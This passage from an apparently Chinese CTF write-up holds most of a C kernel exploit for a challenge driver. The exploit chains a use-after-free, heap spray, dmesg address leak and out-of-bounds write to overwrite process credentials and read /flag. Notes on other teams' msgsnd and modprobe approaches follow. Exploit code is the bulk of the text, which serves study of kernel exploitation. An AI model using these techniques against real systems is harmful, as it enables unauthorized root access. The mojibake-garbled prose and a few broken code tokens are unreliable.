class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *node_addrp, <span class="hljs-keyword">int</span> *node_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Freeing node\n&quot;</span>);<br>    release(fds[S1_DIST_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">//*the crashed process will stop execute, so create a new thread here.</span><br>    <span class="hljs-keyword">pid_t</span> pid = fork();<br>    assert(pid != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//*chlid process</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Reclaiming node\n&quot;</span>);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">ctx</span>;</span><br>        <span class="hljs-comment">//*finalized the last node, avoid the revise of the next finalize</span><br>        reclaim_alloc(&amp;ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x4141000000000000</span>UL, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Finalizing root\n&quot;</span>);<br>        finalize(fds[<span class="hljs-number">0</span>]);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Performing crash query by UAF\n&quot;</span>);<br>        query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// Will never get here</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    usleep(<span class="hljs-number">250</span> * <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Leaking from dmesg\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr, edges_addr;<br>    stage1_leak_dmesg(&amp;dist_addr, &amp;edges_addr);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> node_addr = edges_addr - <span class="hljs-number">0x60</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Dist @ 0x%lx\n&quot;</span>, dist_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Node @ 0x%lx\n&quot;</span>, node_addr);<br><br>    *dist_addrp = dist_addr;<br>    *node_addrp = node_addr;<br>    *node_fdp = fds[<span class="hljs-number">0</span>];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE1_NUM_NODES</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2_spray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd, <span class="hljs-keyword">int</span> before, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> skip, <span class="hljs-keyword">int</span> after)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; before; i++)<br>        create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        fd[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i += skip)<br>    &#123;<br>        release(fd[i]);<br>        fd[i] = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; after; i++)<br>        create();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2</span><span class="hljs-params">(struct reclaim_ctx *victim_ctx, <span class="hljs-keyword">int</span> *victim_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//*errrrrrr, dist array size will be 8b less than STAGE2_NUM_NODES*8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_NUM_NODES 17 <span class="hljs-comment">// dist array size == 0x80 == sizeof node</span></span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[STAGE2_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>); <span class="hljs-comment">// 1 will be written at traversal_idx</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing node\n&quot;</span>);<br>    release(fds[STAGE2_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming node\n&quot;</span>);<br>    <span class="hljs-comment">//*the idx is 17</span><br>    reclaim_alloc(victim_ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) / <span class="hljs-number">8</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// target: sprayed refcount</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Finalizing root\n&quot;</span>);<br>    <span class="hljs-comment">//*now fds[0] have children in different traversals. the last and the others.</span><br>    finalize(fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating predecessor\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_incref_fd = create();<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_SPRAY_NUM 200</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Spraying nodes\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_fd[STAGE2_SPRAY_NUM];<br>    stage2_spray(spray_fd, <span class="hljs-number">30</span>, STAGE2_SPRAY_NUM, <span class="hljs-number">4</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Incrementing sprayed refcounts\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>            llink(spray_incref_fd, spray_fd[i], <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//*above ops create gaps in size of struct_node for dis_arr</span><br>    <span class="hljs-comment">//*next line there is nothing special</span><br>    finalize(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Corrupting refcount\n&quot;</span>);<br>    <span class="hljs-comment">//*use the OOB to corrupt the dis_arr&#x27;s adjacent node struct.</span><br>    query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*release the root, but only the node whose refcount has been modified will be freed</span><br>    <span class="hljs-comment">//*and all fds except for root retain the same as before.</span><br>    release(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming victim node\n&quot;</span>);<br>    reclaim_free(victim_ctx); <span class="hljs-comment">// unblock fault</span><br>                              <span class="hljs-comment">// ephemeral alloc to put two 0xff at the end for traversal top bytes</span><br>                              <span class="hljs-comment">//*these two bytes are in next uffd page</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>] = <span class="hljs-number">0xff</span>;<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">2</span>] = <span class="hljs-number">0xff</span>;<br>    <span class="hljs-comment">//*now there are serveral gaps in size of node_t, which one will be chosed?</span><br>    <span class="hljs-comment">//*good luck. at least the following two lines will use the same chunk.</span><br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, buf, <span class="hljs-keyword">sizeof</span>(buf), XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    reclaim_alloc(victim_ctx, <span class="hljs-number">0</span>, <span class="hljs-number">1337</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Searching for victim node(fd)\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> victim_fd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span> =</span> &#123;<br>                .num_children = <span class="hljs-number">0</span>,<br>            &#125;;<br>            get_info(spray_fd[i], &amp;info);<br>            <span class="hljs-keyword">if</span> (info.num_children == <span class="hljs-number">1337</span>)<br>            &#123;<br>                victim_fd = spray_fd[i];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//*indeed, this totally depends on luck...</span><br>    assert(victim_fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Victim fd = %d\n&quot;</span>, victim_fd);<br>    *victim_fdp = victim_fd;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_NUM_NODES</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE3_READ_NUM_CHILDREN 0x4142133703030303</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">stage3_read</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    reclaim_free(ctx);<br>    <span class="hljs-comment">// during read, we keep a special num_children so we can find ourselves</span><br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, STAGE3_READ_NUM_CHILDREN, <span class="hljs-number">0</span>, addr);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span>;</span><br>    get_info(fd, &amp;info);<br>    <span class="hljs-keyword">return</span> info.traversal_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage3</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> *scratch_fds, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr,</span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_node_addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Finding victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*.......nb</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> victim_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">6000</span>; i &lt; <span class="hljs-number">10000</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">//*why the node is sizeof(node_t) aligned???</span><br>        <span class="hljs-comment">//*is there something strange in kernel slab memory manager?</span><br>        <span class="hljs-comment">//*7000~7800</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr = s1_node_addr + i * <span class="hljs-number">0x80</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> value = stage3_read(ctx, fd, addr + <span class="hljs-number">0x58</span>);<br>        <span class="hljs-keyword">if</span> (value == STAGE3_READ_NUM_CHILDREN)<br>        &#123;<br>            victim_addr = addr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    assert(victim_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Victim @ 0x%lx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Findings creds\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> current = stage3_read(ctx, fd, victim_addr + <span class="hljs-number">0x10</span>); <span class="hljs-comment">// state_lock.owner</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] current = 0x%lx\n&quot;</span>, current);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cred_addr = stage3_read(ctx, fd, current + <span class="hljs-number">0xa90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] cred @ 0x%lx\n&quot;</span>, cred_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Crafting linkable node\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x0</span>) = <span class="hljs-number">100000</span>;              <span class="hljs-comment">// id</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">0</span>;                   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>; <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x68</span>) = victim_addr + <span class="hljs-number">0x68</span>; <span class="hljs-comment">// edges.prev (empty list)</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Building graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> graph_fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        graph_fds[i] = scratch_fds[i]; <span class="hljs-comment">// avoid allocations, they mess stuff up</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        llink(graph_fds[<span class="hljs-number">0</span>], graph_fds[i], <span class="hljs-number">0</span>);<br>    llink(graph_fds[<span class="hljs-number">0</span>], fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// weight = write primitive value (zero for root creds)</span><br>    finalize(graph_fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Freeing stage1 dist array\n&quot;</span>);<br>    <span class="hljs-comment">//*due to stage 1 child process crashed, we have no choice but this method.</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                     <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// is_finalized</span><br>                                                          <span class="hljs-comment">// fake node_array overlaps unused nb_lock</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x0</span>) = <span class="hljs-number">0</span>;             <span class="hljs-comment">// fake node_array.size</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x10</span>) = s1_dist_addr; <span class="hljs-comment">// fake node_array.nodes (will be freed)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>;  <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = victim_addr + <span class="hljs-number">0x38</span>;  <span class="hljs-comment">// traversal = fake node_array</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br>    release(fd);   <span class="hljs-comment">// free s1_dist_addr</span><br>    fd = create(); <span class="hljs-comment">// immediately reclaim victim node to restore stable state</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Overwriting cred\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> write_addr = cred_addr + <span class="hljs-number">8</span> * <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> idx = (write_addr - s1_dist_addr) / <span class="hljs-number">8</span>;<br>    reclaim_free(ctx);<br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, idx, <span class="hljs-number">0</span>);<br>    query(graph_fds[<span class="hljs-number">0</span>], graph_fds[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//kmalloc the orignal s1_dist_addr</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(read(fd, buf, <span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>) != <span class="hljs-number">-1</span>);<br>    close(fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;!!! FLAG: %s\n&quot;</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//*what are these?</span><br>    <span class="hljs-keyword">int</span> scratch_fds[<span class="hljs-number">12</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++)<br>        scratch_fds[i] = create();<br><br>    <span class="hljs-comment">// Leak a distance array (still malloc&#x27;ed) and the address of a live node</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr, s1_node_addr;<br>    <span class="hljs-keyword">int</span> s1_node_fd;<br>    stage1(&amp;s1_dist_addr, &amp;s1_nod e_addr, &amp;s1_node_fd);<br><br>    <span class="hljs-comment">// Get a fd that can be freed and reclaimed repeatedly</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">victim_ctx</span>;</span><br>    <span class="hljs-keyword">int</span> victim_fd;<br>    stage2(&amp;victim_ctx, &amp;victim_fd);<br><br>    <span class="hljs-comment">// Get somewhat rootish privileges</span><br>    stage3(&amp;victim_ctx, victim_fd, scratch_fds, s1_dist_addr, s1_node_addr);<br><span class="hljs-function">F4</span><br><span class="hljs-function">    <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="æ¥è‡ªperfectblueçš„exp"><a href="#æ¥è‡ªperfectblueçš„exp" class="headerlink" title="æ¥è‡ªperfectblueçš„exp:"></a>æ¥è‡ªperfectblueçš„exp:</h3><p>mutexçš„ç»“æ„: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> &#123;</span><br>  <span class="hljs-keyword">uint64_t</span> owner;<br>  <span class="hljs-keyword">uint64_t</span> wait_lock;<br>  <span class="hljs-keyword">void</span>* prev;<br>  <span class="hljs-keyword">void</span>* next;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>æ”¹è¿›ç»†èŠ‚:</p><ul><li>ç¬¬ä¸€æ¬¡crashå¯ä»¥ä½¿ç”¨<code>refcount_warn_saturate</code>. è¿™æ ·åªè¦ä»¤refcountç­‰äº0, å°±ä¼šè§¦å‘finalizeä¸­çš„è­¦å‘Š, ä»è€Œå¯¼è‡´crashçš„äº§ç”Ÿ, ä¸è¿‡expä¸­ç®€å•çš„ä½¿ç”¨äº†sleepç­‰å¾…çº¿ç¨‹, ä»¥åŠæ‰‹åŠ¨è¾“å…¥dmesgä¿¡æ¯. ä¸Šé¢ä¸€ä¸ªæˆ˜é˜Ÿçš„expä¸­è§£æå†…æ ¸æ—¥å¿—çš„ä»£ç å¯ä»¥æ‹¿æ¥é‡å¤åˆ©ç”¨, å…å¾—åœ¨è°ƒè¯•çš„æ—¶å€™æµªè´¹æ—¶é—´.<br>å¥½å§è¿™å¾ˆæœ‰é—®é¢˜, è¿›å…¥äº†è¿™ä¸ªå‡½æ•°ä¹‹åå¯„å­˜å™¨å€¼éƒ½å˜äº†. ä¸å¥½è¯„ä»·. </li><li>å¥½äº†, çœ‹ä¸æ‡‚é‚£ä¸ªleakå‡ºæ¥çš„æ˜¯ä¸ªå•¥, ä»€ä¹ˆæ˜¯kmalloc_32/128???ä¹Ÿæ²¡ä¸ªwpè§£é‡Šä¸€ä¸‹. </li></ul><h4 id="exp-ç•¥"><a href="#exp-ç•¥" class="headerlink" title="exp: ç•¥"></a>exp: ç•¥</h4><h3 id="æ¥è‡ªbalsnæˆ˜é˜Ÿ"><a href="#æ¥è‡ªbalsnæˆ˜é˜Ÿ" class="headerlink" title="æ¥è‡ªbalsnæˆ˜é˜Ÿ:"></a>æ¥è‡ªbalsnæˆ˜é˜Ÿ:</h3><p>ä»…ä»…ä¸¤ç™¾å¤šè¡Œ, è¿™ä¹ˆç®€æ´. </p><ul><li>crashç”¨åˆ°äº†<code>refcount_warn_saturate</code>. åŸå› æ˜¯finalizeä¹‹å‰releaseä¼šä½¿refcountå˜0. </li><li>ç”¨åˆ°äº†msgsnd, ä¹Ÿå°±æ˜¯kmallocæœ‰æœ€å¤§å’Œæœ€å°é•¿åº¦é™åˆ¶, è€Œä¸”æœ‰ä¸€ä¸ª0x30(48)å­—èŠ‚çš„å¤´éƒ¨. </li><li>msgsndåªèƒ½æ§åˆ¶å0x50çš„åŒºåŸŸ. ä¹Ÿå°±æ˜¯<strong>æœ€åå››è¡Œ</strong> </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">uint64_t</span> id;<br>  <span class="hljs-keyword">uint64_t</span> refcount;<br>  <span class="hljs-keyword">char</span> state_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-keyword">uint64_t</span> is_finalized;<br>  <span class="hljs-keyword">char</span> nb_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-comment">//following is under control</span><br>  <span class="hljs-keyword">uint64_t</span> num_children;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head_t</span> <span class="hljs-title">edges</span>;</span><br>  <span class="hljs-keyword">uint64_t</span> traversal_idx;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_list_t</span> *<span class="hljs-title">traversal</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>ä¸çŸ¥é“æ€ä¹ˆå¾—å‡ºçš„rbxä¸­å­˜å‚¨kernel_heap, ä¸è¿‡å¯èƒ½æ˜¯ä»å´©æºƒä¿¡æ¯ä¸­å¯¹æ¯”å’ŒçœŸå®heapæœ€æ¥è¿‘çš„ä¸€ä¸ªå¯„å­˜å™¨åœ°å€. </li><li>ç”¨äº†ä¸€ä¸ªå¾ˆå·§å¦™çš„æ–¹æ³•æ¥è·å–dis_arrçš„åœ°å€, åœ¨ç”¨æˆ·åŒºå»ºç«‹ä¸€ä¸ªå¾ˆå¤§çš„ç¼“å†²åŒº, çŒœæµ‹åœ¨å·²æœ‰çš„heapåœ°å€é™„è¿‘, è®©idxåç§»è¶Šç•Œæº¢å‡ºä»å†…æ ¸åœ°å€ç»•å›åˆ°ç¼“å†²åŒºä¸­, æ£€æŸ¥å“ªä¸ªåœ°å€ä¸Šçš„æ•°æ®è¢«ä¿®æ”¹å°±å¯æ¨ç®—çœŸå®çš„dis_arr. å†æ ¹æ®dis_arræ¥ç®—å‡ºå’Œmodprobeçš„åœ°å€. è¿›è€Œä¿®æ”¹åˆ°shellcodeå‡½æ•°ä¸­.<br>å¯è¡Œçš„åŸå› ä¸ºæœªå¼€smep+smap. </li></ul><p>é‡åˆ°çš„é—®é¢˜:</p><ul><li>è¯»å–å†…æ ¸é”™è¯¯ä¿¡æ¯è«åå‡ºé”™, æ¢æˆäº†<code>klogctl</code>æ‰æˆåŠŸ. 